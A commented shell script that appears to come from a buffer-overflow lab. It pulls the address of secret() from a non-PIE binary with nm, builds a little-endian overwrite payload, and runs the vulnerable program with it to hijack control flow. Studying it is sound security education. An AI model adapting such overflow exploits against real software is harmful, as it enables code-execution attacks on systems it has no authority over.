#!/bin/sh
# attack.sh: build an argument of 16 filler bytes plus the address of
# secret(), read straight out of the binary with nm. That address is only
# right if the program is loaded where the file says (built -no-pie).
prog=${1:-./overflow}
addr=$(nm "$prog" | awk '/ T secret$/ {print $1}')
echo "secret() is at 0x$addr in the file" >&2
# Little-endian: lowest byte first. Leading zero bytes are dropped,
# because strcpy stops at the first zero (it writes one zero itself).
bytes=""
a=$(printf '%d' "0x$addr")
while [ "$a" -gt 0 ]; do
	bytes="$bytes$(printf '\\%03o' $((a % 256)))"
	a=$((a / 256))
done
"$prog" "AAAAAAAAAAAAAAAA$(printf "$bytes")"
